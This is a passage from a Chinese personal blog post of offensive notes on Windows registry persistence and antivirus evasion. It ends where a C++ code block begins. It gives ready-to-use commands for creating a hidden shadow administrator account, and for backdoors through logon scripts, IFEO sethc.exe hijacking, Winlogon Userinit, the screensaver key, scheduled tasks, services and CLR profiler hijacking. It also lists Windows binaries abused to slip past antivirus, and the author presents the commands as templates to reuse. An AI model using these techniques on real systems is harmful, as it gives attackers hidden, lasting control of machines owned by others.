<!DOCTYPE html><html lang="en" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png"><link rel="icon" href="/img/fluid.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="author" content="CDxiaodong"><meta name="keywords" content=""><meta name="description" content="熟悉注册表渗透权限维持（）注册表对于权限维持有很大用处。 搁置了很久。一直想写个总结方便以后使用 先看看注册表的自启动项 一、注册表自启动项自启动项地址C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup MSF的Persistence模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：Run和RunOnce，两者的区别如下"><meta property="og:type" content="article"><meta property="og:title" content="注册表免杀"><meta property="og:url" content="http://example.com/%E7%86%9F%E6%82%89%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B8%97%E9%80%8F%E5%85%8D%E6%9D%80%E6%8C%87%E4%BB%A4.html"><meta property="og:site_name" content="CD_blog"><meta property="og:description" content="熟悉注册表渗透权限维持（）注册表对于权限维持有很大用处。 搁置了很久。一直想写个总结方便以后使用 先看看注册表的自启动项 一、注册表自启动项自启动项地址C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup MSF的Persistence模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：Run和RunOnce，两者的区别如下"><meta property="og:locale" content="en_US"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225134255543.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201826550.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827076.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827478.webp"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827368.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827615.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225133438148.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225133505704.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225133527553.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225133825608.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-16404251409552.webp"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/640.webp"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/640.webp"><meta property="og:image" content="http://example.com/Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/640.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-16404251510935.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-16404251489924.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-16404251548426.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-16404251560987.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-16404251577068.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-16404251593459.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-164042516084310.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-164042516271211.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-164042516440612.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/640-164042516596913.webp"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225143153818.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225145501769.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225145751907.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225145808681.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225145836598.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225145851974.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225150021595.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225150102381-164041566314418.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225150141799.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225150216295.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225150239387.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225150253132.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225150324745.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225150348696.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225150413416.png"><meta property="article:published_time" content="2022-12-20T12:43:09.760Z"><meta property="article:modified_time" content="2023-02-20T10:29:12.000Z"><meta property="article:author" content="CDxiaodong"><meta property="article:tag" content="学习笔记"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20211225134255543.png"><meta name="referrer" content="no-referrer-when-downgrade"><title>注册表免杀 - CD_blog</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/mac.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var dntVal,CONFIG={hostname:"example.com",root:"/",version:"1.9.4",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!0,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:"eJkDJodFGiDL0TVTWRwDW40Z-gzGzoHsz",app_key:"xhVxcHFbhAlnmT8nFUbU2ps7",server_url:null,path:"window.location.pathname",ignore_local:!1}},search_path:"/local-search.xml"};CONFIG.web_analytics.follow_dnt&&(dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on")))</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>CD_blog</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> <span>Home</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> <span>Archives</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> <span>Categories</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> <span>Tags</span></a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> <span>About</span></a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> <span>Links</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/default.png) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="注册表免杀"></span></div><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2022-12-20 20:43" pubdate>December 20, 2022 pm</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 20k words </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 165 mins </span><span id="leancloud-page-views-container" class="post-meta" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="leancloud-page-views"></span> views</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 style="display:none">注册表免杀</h1><div class="markdown-body"><h1 id="熟悉注册表渗透权限维持（）"><a href="#熟悉注册表渗透权限维持（）" class="headerlink" title="熟悉注册表渗透权限维持（）"></a>熟悉注册表渗透权限维持（）</h1><p>注册表对于权限维持有很大用处。</p><p>搁置了很久。一直想写个总结方便以后使用</p><p>先看看注册表的自启动项</p><h2 id="一、注册表自启动项"><a href="#一、注册表自启动项" class="headerlink" title="一、注册表自启动项"></a>一、注册表自启动项</h2><p>自启动项地址C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup</p><p><code>MSF</code>的<code>Persistence</code>模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：<code>Run</code>和<code>RunOnce</code>，两者的区别如下</p><ol><li>Run：该项下的键值即为开机启动项，每一次随着开机而启动。</li><li>RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</li></ol><p>常见注册表启动项键的位置：</p><p>用户级</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce<br><br></code></pre></td></tr></table></figure><p>系统级</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run<br>\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce<br><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225134255543.png" srcset="/img/loading.gif" lazyload alt="image-20211225134255543"></p><p>在这里添加可执行文件既能自启动。后面加个 -hide 还能躲在任务栏里启动</p><p>添加格式 下面各个利用姿势里面有写。 模板套一下就行</p><h2 id="二、下面再介绍win自带113个可执行白名单远控免杀软件"><a href="#二、下面再介绍win自带113个可执行白名单远控免杀软件" class="headerlink" title="二、下面再介绍win自带113个可执行白名单远控免杀软件"></a>二、下面再介绍win自带113个可执行白名单远控免杀软件</h2><p>有多种配合方式</p><p>可以通过劫持白名单程序注入载荷或dll劫持+软件隐身术+自启动进行免杀维持</p><p>113个可执行白名单文件如下：</p><p>：Rundll32.exe、Msiexec.exe、MSBuild.exe、InstallUtil.exe、Mshta.exe、Regsvr32.exe、Cmstp.exe、CScript.exe、WScript.exe、Forfiles.exe、te.exe、Odbcconf.exe、InfDefaultInstall.exe、Diskshadow.exe、PsExec.exe、Msdeploy.exe、Winword.exe、Regasm.exe、Regsvcs.exe、Ftp.exe、pubprn.vbs、winrm.vbs、slmgr.vbs、Xwizard.exe、Compiler.exe、IEExec.exe、MavInject32、Presentationhost.exe、Wmic.exe、Pcalua.exe、Url.dll、zipfldr.dll、Syncappvpublishingserver.vbs等等</p><p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/shuteer_xu/article/details/106346101">https://blog.csdn.net/shuteer_xu/article/details/106346101</a></p><h2 id="三、现在从多方面讲讲注册表的利用之处"><a href="#三、现在从多方面讲讲注册表的利用之处" class="headerlink" title="三、现在从多方面讲讲注册表的利用之处"></a>三、现在从多方面讲讲注册表的利用之处</h2><p><strong>1.利用注册表隐藏用户（影子账户）</strong></p><p>①使用如下命令创建隐藏用户并加入管理员组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">net user <span class="hljs-built_in">test</span>$ 123456 /add<br>net localgroup administrators <span class="hljs-built_in">test</span>$ /add<br></code></pre></td></tr></table></figure><p>创建成功后使用net user命令无法查看到此用户，但是在计算机管理页面中还是可以看到，需要通过修改注册表来隐藏。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201826550.png" srcset="/img/loading.gif" lazyload alt="image-20211225133242946"></p><p>②打开注册表（HKEY_LOCAL_MACHINE\SAM\SAM）</p><p>修改SAM权限，赋予adminitrators完全控制权限。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827076.png" srcset="/img/loading.gif" lazyload alt="image-20211225133011115"></p><p>③将Administrator用户对应项的F数据值复制到test$用户对应项的F数据值</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827478.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827368.png" srcset="/img/loading.gif" lazyload alt="image-20211225133334128"></p><p>⑤将test$和所对应项000003F1导出，分别命名为test.reg和1.reg</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201827615.png" srcset="/img/loading.gif" lazyload alt="image-20211225133429589"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225133438148.png" srcset="/img/loading.gif" lazyload alt="image-20211225133438148"></p><p>⑤删除test$用户，将test.reg和1.reg导入注册表</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> user <span class="hljs-keyword">test</span>$ /del<br><br>regedit /s <span class="hljs-keyword">test</span>.<span class="hljs-keyword">reg</span><br><br>regedit /s 1.<span class="hljs-keyword">reg</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225133505704.png" srcset="/img/loading.gif" lazyload alt="image-20211225133505704"></p><p>⑥此时在用户组已经看不到test$用户，只能在注册表中能看到。</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225133527553.png" srcset="/img/loading.gif" lazyload alt="image-20211225133527553"></p><p>2.<strong>logon scripts后门</strong></p><p>Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截。</p><h6 id="演示："><a href="#演示：" class="headerlink" title="演示："></a><strong>演示：</strong></h6><p>注册表位置：HKEY_CURRENT_USER\Environment</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Environment&quot;</span> /v UserInitMprLogonScript /t REG_SZ /d <span class="hljs-string">&quot;C:\666.exe&quot;</span>   <span class="hljs-comment">#创建键为：UserInitMprLogonScript，其键值为我们要启动的程序路径</span></span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225133825608.png" srcset="/img/loading.gif" lazyload alt="image-20211225133825608"></p><p>重启，即可上线。</p><p><strong>3.映像劫持</strong></p><p>“映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。当一个可执行程序位于IFEO的控制中时，它的内存分配则根据该程序的参数来设定，而WindowsN T架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就运行出问题。</p><h6 id="演示：-1"><a href="#演示：-1" class="headerlink" title="演示："></a><strong>演示：</strong></h6><p>注册表位置：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</p><p>在此注册表位置添加项sethc.exe（配合sethc指代键），添加debugger键的值为c:\windows\system32\cmd.exe</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v <span class="hljs-string">&quot;Debugger&quot;</span> /t REG_SZ /d <span class="hljs-string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br><br><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p>此时点击五次shift键会打开cmd。</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251409552.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><h4 id="④注册表自启动后门（开头有讲，这里作为补充）"><a href="#④注册表自启动后门（开头有讲，这里作为补充）" class="headerlink" title="④注册表自启动后门（开头有讲，这里作为补充）"></a>④注册表自启动后门（开头有讲，这里作为补充）</h4><p>还有这个位置：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</p><p>修改键Userinit的值，重启就会自动运行程序。</p><p><img src="/../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/640.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p><img src="/../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/640.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><h4 id="⑤屏幕保护程序后门"><a href="#⑤屏幕保护程序后门" class="headerlink" title="⑤屏幕保护程序后门"></a>⑤<strong>屏幕保护程序后门</strong></h4><p>屏幕保护是Windows功能的一部分，使用户可以在一段时间不活动后放置屏幕消息或图形动画。Windows的此功能被威胁参与者滥用为持久性方法。这是因为屏幕保护程序是具有.scr文件扩展名的可执行文件，并通过scrnsave.scr实用程序执行。</p><h6 id="演示：-2"><a href="#演示：-2" class="headerlink" title="演示："></a><strong>演示：</strong></h6><p>注册表位置：HKEY_CURRENT_USER\Control Panel\Desktop</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SCRNSAVE</span>.EXE为默认的屏保程序，我们可将此键值设置为我们要利用的恶意程序。在本质上，.scr文件是可执行文件。ScreenSaveActive表示屏保状态，<span class="hljs-number">1</span>为启动，<span class="hljs-number">0</span>为关闭。ScreenSaverTimeout表示屏幕保护程序启动前系统的空闲事件，单位为秒，默认为<span class="hljs-number">900</span>(<span class="hljs-number">15</span>分钟)。ScreenSaverIsSecure默认参数为<span class="hljs-number">0</span>，标识不需要密码即可解锁。<br></code></pre></td></tr></table></figure><p><img src="/../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/640.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p>修改SCRASAVE.EXE的值为后门程序路径，等待屏保时间自动运行。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Control Panel\Desktop&quot;</span> /v SCRNSAVE.EXE /t REG_SZ /d <span class="hljs-string">&quot;c:\666.exe&quot;</span> /f</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251510935.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251489924.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><h4 id="⑥-计划任务后门"><a href="#⑥-计划任务后门" class="headerlink" title="⑥.计划任务后门"></a>⑥.<strong>计划任务后门</strong></h4><p>schtasks命令设定计划自动启动后门程序。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/Create</span> <span class="hljs-string">/tn</span> Updater <span class="hljs-string">/tr</span> c:\666.exe <span class="hljs-string">/sc</span> minute <span class="hljs-string">/mo</span> 5  <span class="hljs-comment">#每5分钟自动执行666.exe</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251548426.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251560987.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251577068.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><h4 id="⑦-服务自启动后门"><a href="#⑦-服务自启动后门" class="headerlink" title="⑦.服务自启动后门"></a>⑦.<strong>服务自启动后门</strong></h4><p>自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务。</p><h6 id="演示：-3"><a href="#演示：-3" class="headerlink" title="演示："></a><strong>演示：</strong></h6><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">sc</span> create <span class="hljs-keyword">test</span> binpath= c:\666.exe    （注意等号后面有空格）#创建服务<span class="hljs-keyword">sc</span> config <span class="hljs-keyword">test</span> start= auto    #设置服务为自动启动<span class="hljs-keyword">net</span> start <span class="hljs-keyword">test</span>                #启动服务<br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-16404251593459.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-164042516084310.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p><strong>⑧CLR劫持</strong></p><p>CLR全称Common Language Runtime，中文名称为公共语言运行时。CLR是.NETFramework的主要执行引擎，作用之一是监视程序的运行。可以理解成，让系统在执行.NET程序的时候先执行一个你指定的dll文件。</p><p>1.修改注册表：HKEY_CURRENT_USER\Software\Classes\CLSID\</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">REG ADD <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1234-1234-1234-111111111111&#125;\InProcServer32&quot;</span> <span class="hljs-string">/VE</span> <span class="hljs-string">/T</span> REG_SZ <span class="hljs-string">/D</span> <span class="hljs-string">&quot;C:\test.dll&quot;</span> <span class="hljs-string">/FREG</span> ADD <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;11111111-1234-1234-1234-111111111111&#125;\InProcServer32&quot;</span> <span class="hljs-string">/V</span> ThreadingModel <span class="hljs-string">/T</span> REG_SZ <span class="hljs-string">/D</span> Apartment <span class="hljs-string">/F</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-164042516271211.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p>2.配置全局环境变量，不然只在当前cmd窗口劫持.net程序，然后直接执行powershell即可上线。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SETX</span> COR_ENABLE_PROFILING <span class="hljs-number">1</span> /MSETX COR_PROFILER &#123;<span class="hljs-number">11111111</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">111111111111</span>&#125; /M<br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-164042516440612.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/640-164042516596913.webp" srcset="/img/loading.gif" lazyload alt="图片"></p><p><strong>三</strong>中方法是通过参考链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/cAjdbHfNc4Kh68zzwTfJgA">https://mp.weixin.qq.com/s/cAjdbHfNc4Kh68zzwTfJgA</a></p><p>这个链接的参考链接是：</p><p>1.<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a><br>2.<a target="_blank" rel="noopener" href="https://hackergu.com/power-clr-thief/">https://hackergu.com/power-clr-thief/</a><br>3.<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1850726">https://cloud.tencent.com/developer/article/1850726</a><br>4.<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6461">https://xz.aliyun.com/t/6461</a><br>5.<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/178286">https://cloud.tencent.com/developer/article/178286</a></p><h2 id="四：恶意软件隐身术"><a href="#四：恶意软件隐身术" class="headerlink" title="四：恶意软件隐身术"></a>四：恶意软件隐身术</h2><p>把可执行文件隐藏在注册表里</p><p>一个并不多见的恶意软件编写技术：把可执行代码隐藏在windows注册表里。这个技术需要我们把可执行文件的一部分或者入口写进注册表里，然后加载并执行它。这种技术意在隐藏二进制文件潜在的恶意功能，取而代之的是分散在windows注册表里的键值，最终使得恶意二进制文件难以被检测。实际上，键值里的可执行代码被加载的时候，会进行随机次数的编码（重编码），使得特征码扫描更加困难。好的检测策略是监控进程加载数据过程，而不是扫描注册表。</p><h1 id="恶意软件隐身术：把可执行文件隐藏在注册表里"><a href="#恶意软件隐身术：把可执行文件隐藏在注册表里" class="headerlink" title="恶意软件隐身术：把可执行文件隐藏在注册表里"></a>恶意软件隐身术：把可执行文件隐藏在注册表里</h1><p>本文主要描述了一个并不多见的恶意软件编写技术：把可执行代码隐藏在windows注册表里。这个技术需要我们把可执行文件的一部分或者入口写进注册表里，然后加载并执行它。这种技术意在隐藏二进制文件潜在的恶意功能，取而代之的是分散在windows注册表里的键值，最终使得恶意二进制文件难以被检测。实际上，键值里的可执行代码被加载的时候，会进行随机次数的编码（重编码），使得特征码扫描更加困难。好的检测策略是监控进程加载数据过程，而不是扫描注册表。</p><h3 id="0x00-存储文件到注册表"><a href="#0x00-存储文件到注册表" class="headerlink" title="0x00 存储文件到注册表"></a>0x00 存储文件到注册表</h3><hr><p>第一步涉及到把文件导入注册表，文件将被分割多个小部分，并写入到注册表键值中。接下来文件将被提取、重组，最终在一傀儡进程里得以执行。有多个方法实现这一过程。注册表有多种不同的键值类型，足以存储多种格式的数据，包括物理二进制数据、32&#x2F;64位数值、字符串。实际操作中，文件将被BASE64编码以字符串（<code>REG_SZ</code>）形式被存入注册表。</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225143153818.png" srcset="/img/loading.gif" lazyload alt="image-20211225143153818"></p><p>把数据导入到注册表中非常简单。首先通过<code>RegCreateKeyEx</code>打开键值句柄，<code>RegCreateKeyEx</code>的功能是打开一个存在的键值句柄或者创建一个键值句柄，然后通过<code>RegGetValue and RegSetValueEx</code>来进行读取和写入操作。具体操作参见以下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 